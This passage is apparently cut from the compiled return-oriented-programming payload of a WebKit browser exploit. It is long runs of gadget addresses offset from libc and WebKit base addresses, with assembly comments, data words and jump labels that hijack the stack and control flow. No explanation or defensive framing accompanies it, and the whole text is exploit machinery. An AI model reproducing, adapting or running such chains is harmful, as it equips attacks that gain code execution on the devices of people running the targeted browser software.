db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+133744, //L1787
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133760, //L1788
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133728, //L1786
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1786:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1787:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1788:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133864, //L1792
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133928, //L1794
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133912, //L1793
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1792:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1790:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1791:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1793:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1794:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+134040, //L1795+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+134032, //L1795
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1795:
db([0, 0]); // 0x0
set_gadgets([
ropchain+134056, //L1795+24
ropchain+135688, //L1789
libc_base+793877, //pop rsi
ropchain+134112, //L1797
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1796:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1797:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+134200, //L1799
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134216, //L1800
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1799:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1800:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+134368, //L1803
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134400, //L1805
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134352, //L1802
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134384, //L1804
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1802:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1803:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1804:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1805:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134472, //L1806
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134488, //L1807
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1806:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1807:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134648, //L1811
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134600, //L1808
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134616, //L1809
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1808:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1809:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1810:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L1811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+134704, //L1812
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L1812:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+134808, //L1814
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134840, //L1816
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134824, //L1815
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1814:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1815:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1816:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134912, //L1817
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134928, //L1818
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1817:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1818:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135024, //L1820
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135008, //L1819
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1819:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1820:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135104, //L1821
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1821:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1822:
db([10, 0]); // 0xa
set_gadget(libc_base+788575,); //pop rax
//L1823:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135256, //L1825
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135272, //L1826
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135240, //L1824
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1824:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1825:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135440, //L1828
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135456, //L1829
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135424, //L1827
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1827:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1828:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1829:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135576, //L1831
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135608, //L1833
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135592, //L1832
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1830:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1831:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1833:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135680, //L1835
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1835:
db([0, 0]); // 0x0
//L1789:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+135800, //L1837
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135816, //L1838
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135784, //L1836
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1836:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1837:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1838:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135936, //L1840
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135968, //L1842
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135952, //L1841
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1839:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1840:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+136040, //L1844
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1844:
db([0, 0]); // 0x0
//L1736:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136160, //L1846
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136176, //L1847
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136144, //L1845
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1845:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1846:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136280, //L1849
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136328, //L1852
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+136296, //L1850
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1849:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1850:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1851:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1852:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+136440, //L1853+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+136432, //L1853
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1853:
db([0, 0]); // 0x0
set_gadgets([
ropchain+136456, //L1853+24
ropchain+138752, //L1848
libc_base+793877, //pop rsi
ropchain+136512, //L1855
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1854:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1855:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+136600, //L1857
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136616, //L1858
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1857:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1858:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+136768, //L1861
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136800, //L1863
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136752, //L1860
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136784, //L1862
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1860:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1861:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1862:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136872, //L1864
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136888, //L1865
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1864:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1865:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+137048, //L1869
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137000, //L1866
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137016, //L1867
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1866:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1867:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1868:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L1869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+137152, //L1871
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137136, //L1870
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1870:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1871:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137248, //L1873
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1872:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1873:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137336, //L1875
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137352, //L1876
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1875:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1876:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137424, //L1878
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+137440, //L1879
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1878:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137584, //L1882
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137552, //L1880
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137568, //L1881
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1880:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1881:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1882:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137672, //L1884
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1883:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L1884:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137776, //L1886
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1885:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1886:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137864, //L1888
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137880, //L1889
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1888:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1889:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137968, //L1891
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137984, //L1892
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L1891:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1892:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138040, //L1895
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1895:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138160, //L1897
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1897:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138216, //L1899
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1899:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138360, //L1902
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+138328, //L1900
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1900:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1901:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L1902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+138488, //L1904
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138504, //L1905
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+138472, //L1903
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1903:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1904:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138600, //L1906
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138616, //L1907
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1906:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138728, //L1908
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138712, //L1909
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1909:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1908:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+140160, //L1910
//L1848:
libc_base+793877, //pop rsi
ropchain+138808, //L1912
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1911:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1912:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+138896, //L1914
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+138912, //L1915
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1914:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1915:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+139056, //L1919
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139024, //L1917
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139040, //L1918
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1917:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1918:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1919:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+139152, //L1921
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1920:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1921:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+139240, //L1923
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139256, //L1924
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1923:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1924:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+139408, //L1927
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139440, //L1929
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139392, //L1926
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139424, //L1928
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1926:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1927:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1928:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1929:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139536, //L1931
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+139520, //L1930
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1930:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1931:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L1933:
ropchain+139640, //L1932
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+140472, //L1934
//L1932:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+139776, //L1936
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139792, //L1937
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139760, //L1935
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1935:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1936:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139912, //L1939
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139928, //L1940
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
